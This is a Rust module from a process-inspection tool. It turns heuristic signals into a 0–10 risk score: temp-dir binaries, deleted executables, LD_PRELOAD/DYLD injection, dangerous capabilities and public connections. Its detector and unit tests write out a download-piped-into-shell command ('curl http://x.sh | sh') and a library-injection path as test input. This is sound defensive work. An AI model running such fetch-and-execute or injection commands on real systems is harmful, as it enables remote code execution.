//! Risk scoring: aggregate the "something is off about this process"
//! signals into one 0–10 score. Deliberately heuristic — every signal is
//! also reported verbatim so the score never hides its reasoning.

use serde::Serialize;

use crate::binary_id::BinaryIdentity;
use crate::model::{Process, Socket};

pub const MAX_SCORE: u8 = 10;

#[derive(Debug, Clone, Serialize)]
pub struct Risk {
    /// 0–10; each contributing signal has a weight (3/4 for strong
    /// indicators, 1–2 for context).
    pub score: u8,
    pub signals: Vec<String>,
}

pub fn assess(
    p: &Process,
    sockets: &[Socket],
    fd_usage: Option<(u64, u64)>,
    binary: Option<&BinaryIdentity>,
) -> Risk {
    let mut score: u32 = 0;
    let mut signals: Vec<String> = Vec::new();
    let add = |weight: u32, msg: String, score: &mut u32, signals: &mut Vec<String>| {
        *score += weight;
        signals.push(msg);
    };

    if let Some(exe) = &p.exe {
        if is_temp_path(exe) {
            add(
                3,
                format!("binary runs from a temp directory ({})", temp_component(exe)),
                &mut score,
                &mut signals,
            );
        }
    }
    if p.exe_deleted {
        add(
            3,
            "binary deleted from disk while still running".into(),
            &mut score,
            &mut signals,
        );
    }
    if pipes_into_shell(&p.command_line()) {
        add(
            4,
            "command pipes a download straight into a shell".into(),
            &mut score,
            &mut signals,
        );
    }
    if let Some(env) = &p.env {
        for (k, v) in env {
            let ku = k.to_ascii_uppercase();
            if ku == "LD_PRELOAD" && !v.is_empty() {
                add(3, format!("{} injection (={})", k, v), &mut score, &mut signals);
            }
        }
        // Any DYLD_* variable is potential library injection on macOS; list
        // the keys so the report says exactly which.
        let mut dyld: Vec<String> = env
            .iter()
            .filter(|(k, v)| {
                k.to_ascii_uppercase().starts_with("DYLD_") && !v.is_empty()
            })
            .map(|(k, _)| k.clone())
            .collect();
        dyld.sort();
        if !dyld.is_empty() {
            add(
                3,
                format!("DYLD_* variables set (potential library injection): {}", dyld.join(", ")),
                &mut score,
                &mut signals,
            );
        }
    }
    let external = sockets.iter().any(|s| {
        s.pid == Some(p.pid)
            && s.state.eq_ignore_ascii_case("ESTABLISHED")
            && s.peer_addr.as_deref().map(is_public_addr).unwrap_or(false)
    });
    if external {
        add(
            2,
            "established connection to a public address".into(),
            &mut score,
            &mut signals,
        );
    }
    if let Some((used, limit)) = fd_usage {
        if let Some(pct) = (used * 100).checked_div(limit) {
            if pct >= 80 {
                add(
                    2,
                    format!("fd table nearly exhausted ({used}/{limit} open, {pct}%)"),
                    &mut score,
                    &mut signals,
                );
            } else if pct >= 50 {
                add(
                    1,
                    format!("fd usage {used}/{limit} ({pct}%)"),
                    &mut score,
                    &mut signals,
                );
            }
        }
    }

    // Health state (Linux stat / macOS ps): zombie and stopped are findings.
    match p.state.as_deref() {
        Some("Z") => add(2, "process is a zombie (defunct)".into(), &mut score, &mut signals),
        Some("T") => add(1, "process is stopped (T state)".into(), &mut score, &mut signals),
        _ => {}
    }
    // High CPU: over 2h of cumulative CPU time (Go witr's Linux threshold).
    if let Some(ms) = p.cpu_time_ms {
        if ms > 2 * 60 * 60 * 1000 {
            add(1, "process has consumed over 2h of CPU time".into(), &mut score, &mut signals);
        }
    }
    // High memory: RSS over 1 GiB.
    if let Some(kb) = p.mem_kb {
        if kb > 1024 * 1024 {
            add(1, "process is using over 1 GB of memory (RSS)".into(), &mut score, &mut signals);
        }
    }
    // Very old process. A missing start time means "couldn't read it", not
    // "ancient" — only warn on a real timestamp.
    if let Some(started) = p.started {
        let now = crate::util::now_unix();
        if now.saturating_sub(started) > 90 * 24 * 3600 {
            add(1, "process has been running for over 90 days".into(), &mut score, &mut signals);
        }
    }
    // Suspicious working directory (container cwds live in the container's
    // own filesystem, usually "/", so they don't count).
    if p.container.is_none() {
        if let Some(cwd) = &p.cwd {
            if is_suspicious_cwd(cwd) {
                add(
                    2,
                    format!("process is running from a suspicious working directory: {cwd}"),
                    &mut score,
                    &mut signals,
                );
            }
        }
    }
    // Dangerous Linux capabilities (non-root holders only; root already has
    // them by definition and the pipeline warns about root separately).
    if p.user.as_deref() != Some("root") && !p.capabilities.is_empty() {
        let dangerous: Vec<&str> = p
            .capabilities
            .iter()
            .map(|s| s.as_str())
            .filter(|c| is_dangerous_capability(c))
            .collect();
        if !dangerous.is_empty() {
            add(
                2,
                format!("process has dangerous capabilities: {}", dangerous.join(", ")),
                &mut score,
                &mut signals,
            );
        }
    }
    // Code-signature verdict (only computed on deep paths — export / TUI
    // detail): an invalid signature is a strong tamper indicator.
    if let Some(id) = binary {
        if let Some(flag) = id.suspicious() {
            add(3, flag, &mut score, &mut signals);
        }
    }

    Risk {
        score: score.min(MAX_SCORE as u32) as u8,
        signals,
    }
}

/// Go witr's suspiciousDirs: the fs root and the world-writable temp dirs.
fn is_suspicious_cwd(cwd: &str) -> bool {
    matches!(cwd, "/" | "/tmp" | "/var/tmp" | "/private/tmp" | "/private/var/tmp")
}

/// The capability set Go witr flags: powerful enough to matter on their own.
fn is_dangerous_capability(cap: &str) -> bool {
    matches!(
        cap,
        "CAP_SYS_ADMIN"
            | "CAP_SYS_PTRACE"
            | "CAP_NET_RAW"
            | "CAP_DAC_OVERRIDE"
            | "CAP_DAC_READ_SEARCH"
            | "CAP_FOWNER"
            | "CAP_SYS_MODULE"
            | "CAP_SYS_RAWIO"
    )
}

fn is_temp_path(path: &str) -> bool {
    let p = path.to_ascii_lowercase();
    // macOS resolves /tmp → /private/tmp
    p.starts_with("/tmp/")
        || p.starts_with("/private/tmp/")
        || p.starts_with("/var/tmp/")
        || p.starts_with("/private/var/tmp/")
        || p.starts_with("/dev/shm/")
        || p.starts_with("\\temp\\")
        || p.contains("\\appdata\\local\\temp\\")
}

fn temp_component(path: &str) -> String {
    let p = path.replace('\\', "/");
    for marker in ["/tmp/", "/private/tmp/", "/var/tmp/", "/private/var/tmp/", "/dev/shm/"] {
        if let Some(i) = p.find(marker) {
            return p[i + marker.len()..].split('/').next().unwrap_or("").to_string();
        }
    }
    String::new()
}

fn pipes_into_shell(cmd: &str) -> bool {
    let c = cmd.to_ascii_lowercase();
    ["| sh", "|sh", "| bash", "|bash", "| sudo sh", "| sudo bash", "| zsh", "|zsh"]
        .iter()
        .any(|pat| c.contains(pat))
}

/// Heuristic public-address check: RFC1918/loopback/link-local/ULA are not
/// public; everything else numeric is.
pub fn is_public_addr(addr: &str) -> bool {
    let a = addr.trim_start_matches('*');
    if a.is_empty() || a == "0.0.0.0" || a == "::" {
        return false;
    }
    if a.contains(':') {
        // IPv6
        let l = a.to_ascii_lowercase();
        return !(l.starts_with("::1")
            || l.starts_with("fe80")
            || l.starts_with("fc")
            || l.starts_with("fd")
            || l == "::");
    }
    let octets: Vec<u32> = a.split('.').filter_map(|x| x.parse().ok()).collect();
    if octets.len() != 4 {
        return false;
    }
    let (o0, o1, _) = (octets[0], octets[1], octets[2]);
    !(o0 == 10
        || o0 == 127
        || (o0 == 192 && o1 == 168)
        || (o0 == 172 && (16..=31).contains(&o1))
        || (o0 == 169 && o1 == 254))
}

#[cfg(test)]
mod tests {
    use super::*;

    fn proc_with(exe: Option<&str>, cmd: &str, deleted: bool) -> Process {
        Process {
            name: "x".into(),
            exe: exe.map(|e| e.into()),
            exe_deleted: deleted,
            cmdline: vec![cmd.into()],
            ..Default::default()
        }
    }

    #[test]
    fn temp_and_deleted_score() {
        let r = assess(&proc_with(Some("/tmp/evil", ), "/tmp/evil", true), &[], None, None);
        assert_eq!(r.score, 6);
        assert_eq!(r.signals.len(), 2);
        assert!(r.signals.iter().any(|s| s.contains("temp")));
    }

    #[test]
    fn curl_pipe_shell_detected() {
        let r = assess(&proc_with(None, "curl http://x.sh | sh", false), &[], None, None);
        assert!(r.signals.iter().any(|s| s.contains("pipes")));
        assert_eq!(r.score, 4);
        // ordinary pipelines don't trigger
        let ok = assess(&proc_with(None, "cat a | grep b", false), &[], None, None);
        assert_eq!(ok.score, 0);
    }

    #[test]
    fn fd_usage_thresholds() {
        // >=80%: strong signal (weight 2)
        let hot = assess(&proc_with(None, "x", false), &[], Some((90, 100)), None);
        assert_eq!(hot.score, 2);
        assert!(hot.signals.iter().any(|s| s.contains("nearly exhausted")));
        // 50-79%: context signal (weight 1)
        let warm = assess(&proc_with(None, "x", false), &[], Some((55, 100)), None);
        assert_eq!(warm.score, 1);
        // <50% or unreadable limit: silent
        let cool = assess(&proc_with(None, "x", false), &[], Some((10, 100)), None);
        assert_eq!(cool.score, 0);
        let none = assess(&proc_with(None, "x", false), &[], Some((90, 0)), None);
        assert_eq!(none.score, 0);
    }

    #[test]
    fn public_addr_classification() {
        assert!(is_public_addr("93.184.216.34"));
        assert!(!is_public_addr("10.0.0.7"));
        assert!(!is_public_addr("192.168.1.2"));
        assert!(!is_public_addr("172.16.0.1"));
        assert!(is_public_addr("172.32.0.1"));
        assert!(!is_public_addr("127.0.0.1"));
        assert!(!is_public_addr("::1"));
        assert!(!is_public_addr("fe80::1"));
        assert!(!is_public_addr("fd00::1"));
        assert!(is_public_addr("2606:4700::1"));
        assert!(!is_public_addr("*"));
    }

    #[test]
    fn health_state_signals() {
        let mut zombie = proc_with(None, "x", false);
        zombie.state = Some("Z".into());
        let r = assess(&zombie, &[], None, None);
        assert!(r.signals.iter().any(|s| s.contains("zombie")));
        assert_eq!(r.score, 2);

        let mut stopped = proc_with(None, "x", false);
        stopped.state = Some("T".into());
        let r = assess(&stopped, &[], None, None);
        assert!(r.signals.iter().any(|s| s.contains("stopped")));
        assert_eq!(r.score, 1);
    }

    #[test]
    fn resource_and_age_signals() {
        let mut hot = proc_with(None, "x", false);
        hot.cpu_time_ms = Some(3 * 3600 * 1000); // 3h cpu
        hot.mem_kb = Some(2 * 1024 * 1024); // 2 GiB
        hot.started = Some(crate::util::now_unix() - 100 * 24 * 3600); // 100 days
        let r = assess(&hot, &[], None, None);
        assert!(r.signals.iter().any(|s| s.contains("2h of CPU")));
        assert!(r.signals.iter().any(|s| s.contains("1 GB of memory")));
        assert!(r.signals.iter().any(|s| s.contains("90 days")));
        assert_eq!(r.score, 3);

        // Missing fields stay silent.
        let clean = assess(&proc_with(None, "x", false), &[], None, None);
        assert_eq!(clean.score, 0);
    }

    #[test]
    fn suspicious_cwd_and_caps() {
        let mut sussy = proc_with(None, "x", false);
        sussy.cwd = Some("/tmp".into());
        let r = assess(&sussy, &[], None, None);
        assert!(r.signals.iter().any(|s| s.contains("suspicious working directory")));

        // Container cwds are inside the container's own fs — skip.
        let mut boxed = proc_with(None, "x", false);
        boxed.cwd = Some("/".into());
        boxed.container = Some("docker: web (id ab)".into());
        let r = assess(&boxed, &[], None, None);
        assert!(r.signals.is_empty());

        let mut capped = proc_with(None, "x", false);
        capped.user = Some("alice".into());
        capped.capabilities = vec!["CAP_CHOWN".into(), "CAP_SYS_ADMIN".into()];
        let r = assess(&capped, &[], None, None);
        assert!(r
            .signals
            .iter()
            .any(|s| s.contains("dangerous capabilities: CAP_SYS_ADMIN")));
        // root holding the same caps is reported by the root warning instead.
        let mut root = proc_with(None, "x", false);
        root.user = Some("root".into());
        root.capabilities = vec!["CAP_SYS_ADMIN".into()];
        let r = assess(&root, &[], None, None);
        assert!(r.signals.is_empty());
    }

    #[test]
    fn dyld_any_var_flagged() {
        let mut p = proc_with(None, "x", false);
        p.env = Some(vec![
            ("HOME".into(), "/Users/x".into()),
            ("DYLD_LIBRARY_PATH".into(), "/tmp".into()),
            ("DYLD_INSERT_LIBRARIES".into(), "/tmp/evil.dylib".into()),
        ]);
        let r = assess(&p, &[], None, None);
        assert!(r
            .signals
            .iter()
            .any(|s| s.contains("DYLD_* variables set") && s.contains("DYLD_INSERT_LIBRARIES")));
    }
}
